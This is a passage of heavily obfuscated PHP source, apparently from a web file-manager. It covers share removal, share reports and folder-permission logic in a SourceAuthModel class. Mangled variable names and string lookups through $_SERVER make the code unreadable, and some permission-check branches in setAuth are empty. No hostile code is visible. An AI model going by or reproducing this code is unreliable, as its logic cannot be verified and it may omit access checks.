Model($¤ü‘•Ûê[889])->where($ëÉä’Ğ)->field($¤ü‘•Ûê[32])->select(); $Óéòşœ = array_to_keyvalue($‚í·êÑ­, $¤ü‘•Ûê[12], $¤ü‘•Ûê[32]); $Óéòşœ[] = $¬Ş„ñĞö[$¤ü‘•Ûê[32]]; return implode($¤ü‘•Ûê[8], $Óéòşœ); } protected function remove($È›†Èû•) { $¾—·½Ş  =& $_SERVER[÷åé¼î]; $ù Ôáñ = is_array($È›†Èû•) ? $È›†Èû• : array($È›†Èû•); for ($äôÊØ¹± = 0; $äôÊØ¹± < count($ù Ôáñ); $äôÊØ¹±++) { $¤²ƒ‚˜ = $this->getInfo($ù Ôáñ[$äôÊØ¹±]); if ($¤²ƒ‚˜[$¾—·½Ş [647]] == $¾—·½Ş [91]) { Model($¾—·½Ş [617])->eventShare($¤²ƒ‚˜[$¾—·½Ş [193]], $¾—·½Ş [2138]); } if ($¤²ƒ‚˜[$¾—·½Ş [546]] == $¾—·½Ş [91]) { Model($¾—·½Ş [617])->eventShare($¤²ƒ‚˜[$¾—·½Ş [193]], $¾—·½Ş [2137]); } } if (is_array($È›†Èû•)) { $È›†Èû• = array($¾—·½Ş [7], $È›†Èû•); } $“õó×Ó = array($¾—·½Ş [649] => $È›†Èû•); $Ÿî÷ÍúÅ = $this->where($“õó×Ó)->delete(); if ($Ÿî÷ÍúÅ) { Model($¾—·½Ş [650])->where(array($¾—·½Ş [649] => $È›†Èû•))->delete(); } return $Ÿî÷ÍúÅ; } protected function removeBySource($Ø¢Ğİ½‰) { $À®•à‹ =& $_SERVER[÷åé¼î]; $‘ÜÆå¡£ = array($À®•à‹[475] => array($À®•à‹[476], $Ø¢Ğİ½‰)); $Øó©›„ = $this->field($À®•à‹[649])->where($‘ÜÆå¡£)->select(); $Øó©›„ = array_to_keyvalue($Øó©›„, $À®•à‹[12], $À®•à‹[649]); if (!$Øó©›„) { return; } $‘ÜÆå¡£ = array($À®•à‹[2144] => array($À®•à‹[476], $Øó©›„)); $this->where($‘ÜÆå¡£)->delete(); Model($À®•à‹[650])->where($‘ÜÆå¡£)->delete(); } public function listAll($İ×÷Œ¬Ú) { $¦÷ù½ï» =& $_SERVER[÷åé¼î]; $›±é«œ» = array(); if ($İ×÷Œ¬Ú[$¦÷ù½ï»[1779]]) { $›±é«œ»[$¦÷ù½ï»[1779]] = $İ×÷Œ¬Ú[$¦÷ù½ï»[1779]]; } if ($İ×÷Œ¬Ú[$¦÷ù½ï»[825]]) { $ùÁÊü˜í = $İ×÷Œ¬Ú[$¦÷ù½ï»[826]] ? $İ×÷Œ¬Ú[$¦÷ù½ï»[826]] : strtotime(date($¦÷ù½ï»[2152])); $›±é«œ»[$¦÷ù½ï»[231]] = array($¦÷ù½ï»[393], array($İ×÷Œ¬Ú[$¦÷ù½ï»[825]], $ùÁÊü˜í)); } if ($İ×÷Œ¬Ú[$¦÷ù½ï»[33]]) { $›±é«œ»[$İ×÷Œ¬Ú[$¦÷ù½ï»[33]]] = 1; } else { $›±é«œ»[] = array($¦÷ù½ï»[546] => array($¦÷ù½ï»[1084], 0), $¦÷ù½ï»[647] => array($¦÷ù½ï»[1084], 0), $¦÷ù½ï»[2126] => $¦÷ù½ï»[2079]); } if ($İ×÷Œ¬Ú[$¦÷ù½ï»[2075]]) { $›±é«œ»[] = array($¦÷ù½ï»[2123] => $İ×÷Œ¬Ú[$¦÷ù½ï»[2075]], $¦÷ù½ï»[1668] => array($¦÷ù½ï»[443], "\45{$İ×÷Œ¬Ú[$¦÷ù½ï»[2075]]}\45"), $¦÷ù½ï»[2126] => $¦÷ù½ï»[2079]); } $Ì“¯’· = $this->_makeOrder()->where($›±é«œ»)->selectPage(20); if (empty($Ì“¯’·[$¦÷ù½ï»[429]])) { return array(); } $this->_listDataApply($Ì“¯’·[$¦÷ù½ï»[429]]); return $Ì“¯’·; } public function listDataApply($ıò™) { $this->_listDataApply($ıò™); return $ıò™; } private function _listDataApply(&$–Õ»İ„À) { $úØ•Úˆ“ =& $_SERVER[÷åé¼î]; $â¶©ĞĞÅ = array_to_keyvalue($–Õ»İ„À, $úØ•Úˆ“[12], $úØ•Úˆ“[1779]); $®€’’ÂÑ = Model($úØ•Úˆ“[582])->userListInfo(array_unique($â¶©ĞĞÅ)); $’ñÖù¬ = array_to_keyvalue($–Õ»İ„À, $úØ•Úˆ“[12], $úØ•Úˆ“[193]); $šÄ£Æòû = Model($úØ•Úˆ“[889])->sourceListInfo($’ñÖù¬, !0); foreach ($–Õ»İ„À as $÷¼—Ââ£ => &$ÈüëÙú²) { $Ã•™Ë×à = $ÈüëÙú²[$úØ•Úˆ“[1779]]; $ÈüëÙú²[$úØ•Úˆ“[2153]] = $®€’’ÂÑ[$Ã•™Ë×à] ? $®€’’ÂÑ[$Ã•™Ë×à] : !1; $³’Êğ…¤ = $ÈüëÙú²[$úØ•Úˆ“[193]]; $ÈüëÙú²[$úØ•Úˆ“[90]] = $šÄ£Æòû[$³’Êğ…¤] ? $šÄ£Æòû[$³’Êğ…¤] : !1; if ($ÈüëÙú²[$úØ•Úˆ“[90]][$úØ•Úˆ“[489]] == $úØ•Úˆ“[91]) { unset($–Õ»İ„À[$÷¼—Ââ£]); } if ($ÈüëÙú²[$úØ•Úˆ“[90]] != $úØ•Úˆ“[228] && !$ÈüëÙú²[$úØ•Úˆ“[90]]) { unset($–Õ»İ„À[$÷¼—Ââ£]); } } unset($ÈüëÙú²); $–Õ»İ„À = array_values($–Õ»İ„À); } private function _makeOrder($¾ÚÌÄ…ˆ = '') { $±èà±Ã» =& $_SERVER[÷åé¼î]; $í±›Å¨ = array($±èà±Ã»[231], $±èà±Ã»[826], $±èà±Ã»[2140], $±èà±Ã»[2141]); $á¬’°Ù = array($±èà±Ã»[507] => $±èà±Ã»[508], $±èà±Ã»[509] => $±èà±Ã»[510]); $¦ƒŠ¢Ñ = Input::get($±èà±Ã»[514], $±èà±Ã»[7], $±èà±Ã»[481], $í±›Å¨); $Å”ÂÜĞ¹ = Input::get($±èà±Ã»[515], $±èà±Ã»[7], $±èà±Ã»[2154], array($±èà±Ã»[2072], $±èà±Ã»[509])); $Å”ÂÜĞ¹ = $á¬’°Ù[$Å”ÂÜĞ¹]; $¾ÚÌÄ…ˆ = $¾ÚÌÄ…ˆ . "{$¦ƒŠ¢Ñ}\40{$Å”ÂÜĞ¹}"; return $this->order($¾ÚÌÄ…ˆ); } public function reportAdd($Ï±¹èğ•) { $—¥¶‰• =& $_SERVER[÷åé¼î]; $¸„®ŸŠÒ = array($—¥¶‰•[649] => $Ï±¹èğ•[$—¥¶‰•[649]], $—¥¶‰•[1779] => USER_ID); if (Model($—¥¶‰•[2150])->where($¸„®ŸŠÒ)->find()) { return !1; } $Ñã§½Å™ = array($—¥¶‰•[649] => $Ï±¹èğ•[$—¥¶‰•[649]], $—¥¶‰•[1668] => $Ï±¹èğ•[$—¥¶‰•[1668]], $—¥¶‰•[193] => $Ï±¹èğ•[$—¥¶‰•[193]], $—¥¶‰•[525] => $Ï±¹èğ•[$—¥¶‰•[525]], $—¥¶‰•[1779] => USER_ID, $—¥¶‰•[33] => $Ï±¹èğ•[$—¥¶‰•[33]], $—¥¶‰•[510] => $Ï±¹èğ•[$—¥¶‰•[510]]); return Model($—¥¶‰•[2150])->add($Ñã§½Å™); } public function reportList($Õ‚…Şµ) { $ÔÕ‹’¯õ =& $_SERVER[÷åé¼î]; $„í˜ş€µ = array(); if ($Õ‚…Şµ[$ÔÕ‹’¯õ[825]]) { $š’“»âÕ = $Õ‚…Şµ[$ÔÕ‹’¯õ[826]] ? $Õ‚…Şµ[$ÔÕ‹’¯õ[826]] : strtotime(date($ÔÕ‹’¯õ[2152])); $„í˜ş€µ[$ÔÕ‹’¯õ[231]] = array($ÔÕ‹’¯õ[393], array($Õ‚…Şµ[$ÔÕ‹’¯õ[825]], $š’“»âÕ)); } if (isset($Õ‚…Şµ[$ÔÕ‹’¯õ[33]]) && in_array($Õ‚…Şµ[$ÔÕ‹’¯õ[33]], array($ÔÕ‹’¯õ[91], $ÔÕ‹’¯õ[494], $ÔÕ‹’¯õ[2155], $ÔÕ‹’¯õ[2156], $ÔÕ‹’¯õ[2157]))) { $„í˜ş€µ[$ÔÕ‹’¯õ[33]] = $Õ‚…Şµ[$ÔÕ‹’¯õ[33]]; } if (isset($Õ‚…Şµ[$ÔÕ‹’¯õ[815]]) && in_array($Õ‚…Şµ[$ÔÕ‹’¯õ[815]], array($ÔÕ‹’¯õ[228], $ÔÕ‹’¯õ[91], $ÔÕ‹’¯õ[494], $ÔÕ‹’¯õ[2155]))) { $„í˜ş€µ[$ÔÕ‹’¯õ[815]] = $Õ‚…Şµ[$ÔÕ‹’¯õ[815]]; } $»“ âï¸ = Input::get($ÔÕ‹’¯õ[515], $ÔÕ‹’¯õ[7], $ÔÕ‹’¯õ[2154], array($ÔÕ‹’¯õ[2072], $ÔÕ‹’¯õ[509])); $Ÿõ±–« = array($ÔÕ‹’¯õ[507] => $ÔÕ‹’¯õ[508], $ÔÕ‹’¯õ[509] => $ÔÕ‹’¯õ[510]); $ãÃÜÑË = $ÔÕ‹’¯õ[2158] . $Ÿõ±–«[$»“ âï¸]; $âä£¢²‹ = Model($ÔÕ‹’¯õ[2150])->where($„í˜ş€µ)->order($ãÃÜÑË)->selectPage(20); if (empty($âä£¢²‹[$ÔÕ‹’¯õ[429]])) { return array(); } $¦†ª«› = array_to_keyvalue_group($âä£¢²‹[$ÔÕ‹’¯õ[429]], $ÔÕ‹’¯õ[815], $ÔÕ‹’¯õ[649]); if (!empty($¦†ª«›[0])) { $Õ‚…Şµ = $¦†ª«›[0]; $„í˜ş€µ = array($ÔÕ‹’¯õ[649] => array($ÔÕ‹’¯õ[7], $Õ‚…Şµ)); $®‡Ì›• = $this->where($„í˜ş€µ)->field($ÔÕ‹’¯õ[649])->select(); $®‡Ì›• = array_to_keyvalue($®‡Ì›•, $ÔÕ‹’¯õ[12], $ÔÕ‹’¯õ[649]); $Ü©Ìßå” = array_diff($Õ‚…Şµ, $®‡Ì›•); if (!empty($Ü©Ìßå”)) { foreach ($âä£¢²‹[$ÔÕ‹’¯õ[429]] as $Ğ©êÌõ => $ÄÜùçÙ™) { if (in_array($ÄÜùçÙ™[$ÔÕ‹’¯õ[649]], $Ü©Ìßå”)) { unset($âä£¢²‹[$ÔÕ‹’¯õ[429]][$Ğ©êÌõ]); } } } } $this->_listDataApply($âä£¢²‹[$ÔÕ‹’¯õ[429]]); return $âä£¢²‹; } public function reportStatus($°Ğ´£€«) { $íÌë¬Ø£ =& $_SERVER[÷åé¼î]; $úëÜÎĞê = array($íÌë¬Ø£[459] => $°Ğ´£€«[$íÌë¬Ø£[459]]); $ÁèÀ¡Šƒ = Model($íÌë¬Ø£[2150])->where($úëÜÎĞê)->field($íÌë¬Ø£[2159])->find(); if (!$ÁèÀ¡Šƒ) { return !1; } $‘ëº£­æ = array($íÌë¬Ø£[815] => $°Ğ´£€«[$íÌë¬Ø£[815]]); if ($°Ğ´£€«[$íÌë¬Ø£[815]] == $íÌë¬Ø£[2155] && $ÁèÀ¡Šƒ[$íÌë¬Ø£[815]] == $íÌë¬Ø£[2155]) { $‘ëº£­æ[$íÌë¬Ø£[815]] = 0; } $œòó¸Üµ = Model($íÌë¬Ø£[2150])->where($úëÜÎĞê)->save($‘ëº£­æ); if ($°Ğ´£€«[$íÌë¬Ø£[815]] == $íÌë¬Ø£[494]) { if ($ÁèÀ¡Šƒ[$íÌë¬Ø£[525]] != $íÌë¬Ø£[228] && $this->shareFileMeta($ÁèÀ¡Šƒ[$íÌë¬Ø£[525]])) { $this->shareFileMeta($ÁèÀ¡Šƒ[$íÌë¬Ø£[525]], 0); } $this->remove($ÁèÀ¡Šƒ[$íÌë¬Ø£[649]]); return !0; } if ($œòó¸Üµ && $°Ğ´£€«[$íÌë¬Ø£[815]] == $íÌë¬Ø£[2155]) { $Ôê‚Òå² = $‘ëº£­æ[$íÌë¬Ø£[815]] == $íÌë¬Ø£[2155] ? 1 : 0; $this->shareFileMeta($ÁèÀ¡Šƒ[$íÌë¬Ø£[525]], $Ôê‚Òå²); $this->removeByFile($ÁèÀ¡Šƒ[$íÌë¬Ø£[525]]); } return $œòó¸Üµ; } private function removeByFile($éï¦³¸Á) { $ş…ëÂ‡– =& $_SERVER[÷åé¼î]; $¤‹¶ÍÚë = Model($ş…ëÂ‡–[889])->where(array($ş…ëÂ‡–[525] => $éï¦³¸Á))->field($ş…ëÂ‡–[193])->select(); $õò†Íä× = array_to_keyvalue($¤‹¶ÍÚë, $ş…ëÂ‡–[12], $ş…ëÂ‡–[193]); $Åö°Ìè© = array($ş…ëÂ‡–[193] => array($ş…ëÂ‡–[7], $õò†Íä×), $ş…ëÂ‡–[546] => 1); $¤‹¶ÍÚë = $this->where($Åö°Ìè©)->field($ş…ëÂ‡–[649])->select(); if (empty($¤‹¶ÍÚë)) { return; } $›œ´Íé˜ = array_to_keyvalue($¤‹¶ÍÚë, $ş…ëÂ‡–[12], $ş…ëÂ‡–[649]); $this->remove($›œ´Íé˜); } private function shareFileMeta($™Ëãº„¼, $ Ù®¾úı = null) { $µÒÅÍÚÇ =& $_SERVER[÷åé¼î]; $“­—›Ò = array($µÒÅÍÚÇ[525] => $™Ëãº„¼, $µÒÅÍÚÇ[97] => $µÒÅÍÚÇ[2160]); if (is_null($ Ù®¾úı)) { return Model($µÒÅÍÚÇ[2161])->where($“­—›Ò)->find(); } $“­—›Ò[$µÒÅÍÚÇ[434]] = $ Ù®¾úı; Model($µÒÅÍÚÇ[2161])->add($“­—›Ò, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\x75\x72\143\x65\x5f\x61\x75\x74\x68"; public function getAuth($›é©¼¥Æ) { $’À…Í£À =& $_SERVER[÷åé¼î]; $ì‘Î¤ì = $this->sourceAuthSelect($›é©¼¥Æ); $–ïÁÊûŸ = array(); $—ßÓ” = array(); $‹š•¹« = 2 << 25; foreach ($ì‘Î¤ì as $Ë¶‰Æ) { $™œµ…åÃ = Model($’À…Í£À[555])->listData($Ë¶‰Æ[$’À…Í£À[2085]]); if (!$™œµ…åÃ) { continue; } $–ïÁÊûŸ[] = $Ë¶‰Æ; $üãÛÔ· = 0; if ($Ë¶‰Æ[$’À…Í£À[190]] == SourceModel::TYPE_GROUP) { $üãÛÔ· = $‹š•¹« * 2; } if ($Ë¶‰Æ[$’À…Í£À[190]] == SourceModel::TYPE_USER) { $üãÛÔ· = $‹š•¹«; } if ($Ë¶‰Æ[$’À…Í£À[190]] == SourceModel::TYPE_USER && $Ë¶‰Æ[$’À…Í£À[553]] == $’À…Í£À[228]) { $üãÛÔ· = 0; } $—ßÓ”[] = $™œµ…åÃ[$’À…Í£À[471]] + $üãÛÔ·; } array_multisort($—ßÓ”, SORT_DESC, $–ïÁÊûŸ); return $–ïÁÊûŸ; } public function sourceAuthSelect($«‡ß»Ø) { $€µ‘Çâ =& $_SERVER[÷åé¼î]; static $†ê’±îô = array(); $”ƒ…‘Ã = is_array($«‡ß»Ø) ? !1 : !0; if ($”ƒ…‘Ã) { $«‡ß»Ø = array($«‡ß»Ø); } $³ºŒˆÚú = array(); foreach ($«‡ß»Ø as $òÑÜˆ¥) { if (isset($†ê’±îô[$òÑÜˆ¥])) { $³ºŒˆÚú[$òÑÜˆ¥] = $†ê’±îô[$òÑÜˆ¥]; } } if (count($³ºŒˆÚú) == count($«‡ß»Ø)) { return $”ƒ…‘Ã ? $³ºŒˆÚú[$«‡ß»Ø[0]] : $³ºŒˆÚú; } $Æ´•“û  = $€µ‘Çâ[2162]; $Ú…†»˜ı = array($€µ‘Çâ[193] => array($€µ‘Çâ[7], $«‡ß»Ø)); $’™ğ“ = $this->field($Æ´•“û )->order($€µ‘Çâ[459])->where($Ú…†»˜ı)->select(); $êş»÷ú = array_to_keyvalue_group($’™ğ“, $€µ‘Çâ[193]); foreach ($«‡ß»Ø as $òÑÜˆ¥) { $†ê’±îô[$òÑÜˆ¥] = $êş»÷ú[$òÑÜˆ¥] ? $êş»÷ú[$òÑÜˆ¥] : array(); } if ($”ƒ…‘Ã) { return $’™ğ“; } return $êş»÷ú; } public function setAuth($—Ê¬¡½, $ß…¾¥Èš) { $¸ë—Áˆ° =& $_SERVER[÷åé¼î]; $«µ­ÉÑ† = Model($¸ë—Áˆ°[1414])->sourceInfo($—Ê¬¡½); if (!$«µ­ÉÑ†) { return !1; } if ($«µ­ÉÑ†[$¸ë—Áˆ°[190]] != SourceModel::TYPE_GROUP) { return !1; } $ˆß˜Å÷ì = 1; $‡°ïÑƒ¤ = $«µ­ÉÑ†[$¸ë—Áˆ°[553]]; if ($‡°ïÑƒ¤ != $ˆß˜Å÷ì) { $ıûÔ®ÎÖ = array($¸ë—Áˆ°[1977] => $‡°ïÑƒ¤); $Èú•şİá = Model($¸ë—Áˆ°[2071])->field($¸ë—Áˆ°[1779])->where($ıûÔ®ÎÖ)->select(); $Èú•şİá = array_to_keyvalue($Èú•şİá, $¸ë—Áˆ°[12], $¸ë—Áˆ°[1779]); } $ôÍ›´ğ³ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $™£ç©ô = array(); foreach ($ß…¾¥Èš as $°¬Ã‰Á) { if (!in_array($°¬Ã‰Á[$¸ë—Áˆ°[190]], $ôÍ›´ğ³)) { show_json(LNG($¸ë—Áˆ°[2163]), !1); } if ($‡°ïÑƒ¤ != $ˆß˜Å÷ì) { if ($°¬Ã‰Á[$¸ë—Áˆ°[190]] == SourceModel::TYPE_GROUP) { } if ($°¬Ã‰Á[$¸ë—Áˆ°[553]] != 0 && !in_array($°¬Ã‰Á[$¸ë—Áˆ°[553]], $Èú•şİá)) { } } if ($°¬Ã‰Á[$¸ë—Áˆ°[553]] == 0) { $°¬Ã‰Á[$¸ë—Áˆ°[190]] = SourceModel::TYPE_USER; } $™£ç©ô[] = array($¸ë—Áˆ°[193] => $—Ê¬¡½, $¸ë—Áˆ°[190] => intval($°¬Ã‰Á[$¸ë—Áˆ°[190]]), $¸ë—Áˆ°[553] => intval($°¬Ã‰Á[$¸ë—Áˆ°[553]]), $¸ë—Áˆ°[2085] => intval($°¬Ã‰Á[$¸ë—Áˆ°[2085]]) ? intval($°¬Ã‰Á[$¸ë—Áˆ°[2085]]) : 0, $¸ë—Áˆ°[2145] => intval($°¬Ã‰Á[$¸ë—Áˆ°[2145]]) ? intval($°¬Ã‰Á[$¸ë—Áˆ°[2145]]) : -1); } $this->where(array($¸ë—Áˆ°[475] => $—Ê¬¡½))->delete(); $this->addAll($™£ç©ô); return !0; } public function authClear($€æ¼¤µƒ) { $ä²“ÁãÕ =& $_SERVER[÷åé¼î]; $•…ÖÊß‰ = Model($ä²“ÁãÕ[1414])->sourceInfo($€æ¼¤µƒ); $úÑİÑÀÌ = array($€æ¼¤µƒ); if ($•…ÖÊß‰[$ä²“ÁãÕ[469]] == $ä²“ÁãÕ[91]) { $û‘ò¹º¤ = array($ä²“ÁãÕ[636] => array($ä²“ÁãÕ[596], $•…ÖÊß‰[$ä²“ÁãÕ[568]] . $€æ¼¤µƒ . $ä²“ÁãÕ[597])); $úÑİÑÀÌ = Model($ä²“ÁãÕ[1414])->field($ä²“ÁãÕ[475])->where($û‘ò¹º¤)->getField($ä²“ÁãÕ[193], !0); $úÑİÑÀÌ[] = $€æ¼¤µƒ; } $this->where(array($ä²“ÁãÕ[475] => array($ä²“ÁãÕ[476], $úÑİÑÀÌ)))->delete(); return !0; } public function getAllChildren($ˆ±Ë¤áò) { $§¡ŸºÊ¥ =& $_SERVER[÷åé¼î]; $ÄĞ—Úôâ = Model($§¡ŸºÊ¥[1414])->sourceInfo($ˆ±Ë¤áò); if ($ÄĞ—Úôâ[$§¡ŸºÊ¥[469]] != $§¡ŸºÊ¥[91]) { return $this->sourceListAuth(array($ˆ±Ë¤áò)); } if ($ÄĞ—Úôâ[$§¡ŸºÊ¥[190]] != SourceModel::TYPE_GROUP) { return array(); } $€úí®†Ê = 1; $§ÔÂâô¶ = array($ˆ±Ë¤áò); if ($ÄĞ—Úôâ[$§¡ŸºÊ¥[192]] == $§¡ŸºÊ¥[228] && $ÄĞ—Úôâ[$§¡ŸºÊ¥[553]] != $€úí®†Ê) { $§ÔÂâô¶ = $this->groupChidldAllRootSource($ÄĞ—Úôâ[$§¡ŸºÊ¥[553]]); } $ƒûãªƒ¾ = $this->field($§¡ŸºÊ¥[193])->group($§¡ŸºÊ¥[193])->select(); $ƒûãªƒ¾ = array_to_keyvalue($ƒûãªƒ¾, $§¡ŸºÊ¥[12], $§¡ŸºÊ¥[193]); if (!$ƒûãªƒ¾) { return array(); } $ÚÏÒôğ¶ = $§¡ŸºÊ¥[2164]; $¬Êö‘ = array($§¡ŸºÊ¥[193] => array($§¡ŸºÊ¥[7], $ƒûãªƒ¾), $§¡ŸºÊ¥[489] => $§¡ŸºÊ¥[228]); $ãóáÖ©¿ = Model($§¡ŸºÊ¥[889])->field($ÚÏÒôğ¶)->where($¬Êö‘)->select(); $¼²šˆŞ¢ = array($ˆ±Ë¤áò); foreach ($ãóáÖ©¿ as $ÜÂËÔ¯®) { foreach ($§ÔÂâô¶ as $‘·Ê»Ù) { $ÈÛ…Ó°“ = $§¡ŸºÊ¥[50] . $‘·Ê»Ù . $§¡ŸºÊ¥[50]; $ ˆŒÓ²˜ = $ÜÂËÔ¯®[$§¡ŸºÊ¥[568]] . $ÜÂËÔ¯®[$§¡ŸºÊ¥[193]] . $§¡ŸºÊ¥[50]; if (strstr($ ˆŒÓ²˜, $ÈÛ…Ó°“)) { $¼²šˆŞ¢[] = $ÜÂËÔ¯®[$§¡ŸºÊ¥[193]]; break; } } } return $this->sourceListAuth($¼²šˆŞ¢); } private function sourceListAuth($Ï¤‡ÌŸÊ) { $îğøöğÉ =& $_SERVER[÷åé¼î]; $¸ô™¶¤÷ = Model($îğøöğÉ[1414])->sourceListInfo($Ï¤‡ÌŸÊ, !0); $äÌŞÌ‡á = $this->sourceAuthSelect($Ï¤‡ÌŸÊ); $Æ‡Ê±Ã“ = array(); $àüçëêß = array(); foreach ($¸ô™¶¤÷ as $øÓèã£Ñ) { unset($øÓèã£Ñ[$îğøöğÉ[513]]); unset($øÓèã£Ñ[$îğøöğÉ[511]]); unset($øÓèã£Ñ[$îğøöğÉ[471]]); unset($øÓèã£Ñ[$îğøöğÉ[90]]); $ùä§ê“Û = $äÌŞÌ‡á[$øÓèã£Ñ[$îğøöğÉ[193]]]; if (!$ùä§ê“Û) { continue; } $øÓèã£Ñ[$îğøöğÉ[2165]] = $this->authTargetInfo($ùä§ê“Û); $øÓèã£Ñ[$îğøöğÉ[566]] = rtrim($øÓèã£Ñ[$îğøöğÉ[572]], $îğøöğÉ[8]) . $îğøöğÉ[8] . ltrim($øÓèã£Ñ[$îğøöğÉ[566]], $îğøöğÉ[8]); $Æ‡Ê±Ã“[] = $øÓèã£Ñ; $ê˜î±Ò¡ = count(explode($îğøöğÉ[8], trim($øÓèã£Ñ[$îğøöğÉ[566]], $îğøöğÉ[8]))); $àüçëêß[] = $ê˜î±Ò¡ + ($øÓèã£Ñ[$îğøöğÉ[33]] == $îğøöğÉ[78] ? 0 : 1000); } array_multisort($àüçëêß, SORT_ASC, $Æ‡Ê±Ã“); return $Æ‡Ê±Ã“; } private function groupChidldAllRootSource($‹ÏœŞÒĞ) { $³‰ßˆµ° =& $_SERVER[÷åé¼î]; $Í¶«…¸Ä = Model($³‰ßˆµ°[2166])->groupChildrenAll($‹ÏœŞÒĞ); $Ò”„³˜í = array($³‰ßˆµ°[192] => 0, $³‰ßˆµ°[553] => array($³‰ßˆµ°[7], $Í¶«…¸Ä), $³‰ßˆµ°[190] => SourceModel::TYPE_GROUP); $Ä÷¦Ê¤ = Model($³‰ßˆµ°[889])->field($³‰ßˆµ°[193])->where($Ò”„³˜í)->select(); $Ä÷¦Ê¤ = array_to_keyvalue($Ä÷¦Ê¤, $³‰ßˆµ°[12], $³‰ßˆµ°[193]); return $Ä÷¦Ê¤; } private function authTargetInfo($Ê–Âš×å) { $³‹¡ôÂÂ =& $_SERVER[÷åé¼î]; $§ãäÂ¥™ = array(); $øÍéäû = array(); $ÖÉíÅßƒ = 2 << 25; foreach ($Ê–Âš×å as $‚ÑÍöİä) { $õÀë‰Şß = Model($³‹¡ôÂÂ[555])->listData($‚ÑÍöİä[$³‹¡ôÂÂ[2085]]); if (!$õÀë‰Şß) { continue; } if ($‚ÑÍöİä[$³‹¡ôÂÂ[190]] == SourceModel::TYPE_USER) { $™·ÊÄüì = Model($³‹¡ôÂÂ[561])->getInfoSimpleOuter($‚ÑÍöİä[$³‹¡ôÂÂ[553]]); if ($™·ÊÄüì[$³‹¡ôÂÂ[1779]] == $³‹¡ôÂÂ[1267]) { continue; } if ($™·ÊÄüì[$³‹¡ôÂÂ[1779]] == $³‹¡ôÂÂ[228]) { $™·ÊÄüì[$³‹¡ôÂÂ[32]] = LNG($³‹¡ôÂÂ[2167]); } } else { $™·ÊÄüì = Model($³‹¡ôÂÂ[569])->getInfoSimple($‚ÑÍöİä[$³‹¡ôÂÂ[553]]); } if (!$™·ÊÄüì) { continue; } $™·ÊÄüì[$³‹¡ôÂÂ[524]] = $õÀë‰Şß; $§ãäÂ¥™[] = $™·ÊÄüì; $çõ õ—­ = 0; if ($‚ÑÍöİä[$³‹¡ôÂÂ[190]] == SourceModel::TYPE_GROUP) { $çõ õ—­ = $ÖÉíÅßƒ * 2; } if ($‚ÑÍöİä[$³‹¡ôÂÂ[190]] == SourceModel::TYPE_USER) { $çõ õ—­ = $ÖÉíÅßƒ; } if ($‚ÑÍöİä[$³‹¡ôÂÂ[190]] == SourceModel::TYPE_USER && $‚ÑÍöİä[$³‹¡ôÂÂ[553]] == $³‹¡ôÂÂ[228]) { $çõ õ—­ = 0; } $øÍéäû[] = $õÀë‰Şß[$³‹¡ôÂÂ[471]] + $çõ õ—­; } array_multisort($øÍéäû, SORT_DESC, $§ãäÂ¥™); return $§ãäÂ¥™; } public function getAllChildrenByUser($¼Ã€è¢², $ˆØ†½«é) { $†ëö ¤İ =& $_SERVER[÷åé¼î]; $„Õñ·ö‡ = Model($†ëö ¤İ[582])->getInfo($ˆØ†½«é); if (!$ˆØ†½«é || !$¼Ã€è¢² || !$„Õñ·ö‡) { return array(); } $óÖ‚¬˜Õ = Model($†ëö ¤İ[1414])->sourceInfo($¼Ã€è¢²); $‘Îã‘¡ = array(); $¤Âôæ³ = 1; if ($óÖ‚¬˜Õ[$†ëö ¤İ[192]] == $†ëö ¤İ[228] && $óÖ‚¬˜Õ[$†ëö ¤İ[553]] != $¤Âôæ³ && $this->groupContainUser($óÖ‚¬˜Õ[$†ëö ¤İ[553]], $ˆØ†½«é)) { foreach ($„Õñ·ö‡[$†ëö ¤İ[2168]] as $´¨™ÔÃ) { $ØãÂÇ„© = Model($†ëö ¤İ[569])->getInfo($´¨™ÔÃ[$†ëö ¤İ[1977]]); $ÍÚÆş×Ë = Model($†ëö ¤İ[582])->getInfoSimpleOuter($ˆØ†½«é); $ÍÚÆş×Ë[$†ëö ¤İ[524]] = $´¨™ÔÃ[$†ëö ¤İ[471]]; if (Model($†ëö ¤İ[555])->authCheckAction($´¨™ÔÃ[$†ëö ¤İ[471]][$†ëö ¤İ[471]], $†ëö ¤İ[1998])) { continue; } $ªÔÛ—™¢ = array($†ëö ¤İ[32] => $†ëö ¤İ[1287] . $ØãÂÇ„©[$†ëö ¤İ[32]], $†ëö ¤İ[193] => $ØãÂÇ„©[$†ëö ¤İ[90]][$†ëö ¤İ[193]], $†ëö ¤İ[87] => KodIO::make($ØãÂÇ„©[$†ëö ¤İ[90]][$†ëö ¤İ[193]]), $†ëö ¤İ[192] => $†ëö ¤İ[228], $†ëö ¤İ[190] => $†ëö ¤İ[562], $†ëö ¤İ[33] => $†ëö ¤İ[600], $†ëö ¤İ[566] => $ØãÂÇ„©[$†ëö ¤İ[573]], $†ëö ¤İ[1977] => $ØãÂÇ„©[$†ëö ¤İ[1977]], $†ëö ¤İ[570] => $ØãÂÇ„©[$†ëö ¤İ[192]], $†ëö ¤İ[2165] => array($ÍÚÆş×Ë)); $‘Îã‘¡[$ªÔÛ—™¢[$†ëö ¤İ[193]]] = $ªÔÛ—™¢; } } $¬ÒØµŠ¡ = array(); $–¶‚˜³¾ = $this->getAllChildren($¼Ã€è¢²); foreach ($–¶‚˜³¾ as $ù½¼¦Ã) { $›€ˆ¡ŞÛ = !1; foreach ($ù½¼¦Ã[$†ëö ¤İ[2165]] as $««ğ·Ê) { if ($««ğ·Ê[$†ëö ¤İ[1779]]) { if ($««ğ·Ê[$†ëö ¤İ[1779]] == $ˆØ†½«é) { $›€ˆ¡ŞÛ = !0; break; } } if ($««ğ·Ê[$†ëö ¤İ[1977]]) { if ($this->groupContainUser($««ğ·Ê[$†ëö ¤İ[1977]], $ˆØ†½«é)) { $›€ˆ¡ŞÛ = !0; break; } } } if ($›€ˆ¡ŞÛ) { $¬ÒØµŠ¡[] = $ù½¼¦Ã; } $€øÑÍÅ‹ = $ù½¼¦Ã[$†ëö ¤İ[193]]; if (isset($‘Îã‘¡[$€øÑÍÅ‹])) { $ù½¼¦Ã[$†ëö ¤İ[2165]][] = $‘Îã‘¡[$€øÑÍÅ‹][0]; $‘Îã‘¡[$€øÑÍÅ‹] = !1; } } $‘Îã‘¡ = array_filter(array_values($‘Îã‘¡)); $¬ÒØµŠ¡ = array_merge($‘Îã‘¡, $¬ÒØµŠ¡); return $¬ÒØµŠ¡; } public function setAllChildrenByUser($Ë££¥°Ã, $Ş®—Ëº¸, $á™ÍËØì) { 